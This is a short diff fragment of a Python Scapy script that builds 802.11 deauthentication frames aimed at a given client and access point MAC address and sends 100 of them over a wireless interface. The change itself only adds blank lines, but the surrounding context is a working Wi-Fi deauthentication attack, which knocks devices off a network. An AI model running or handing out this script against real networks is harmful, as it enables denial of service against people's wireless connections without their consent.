@@ -9,7 +9,9 @@ trala = "88:D7:F6:2A:5D:4D"
 # addr2: source MAC
 # addr3: Access Point MAC
 dot11 = Dot11(addr1=one_nord, addr2=Error404, addr3=Error404)
+
 # stack them up
 packet = RadioTap()/dot11/Dot11Deauth(reason=7)
+
 # send the packet
 sendp(packet, inter=0.1, count=100, iface="wlan1", verbose=1)
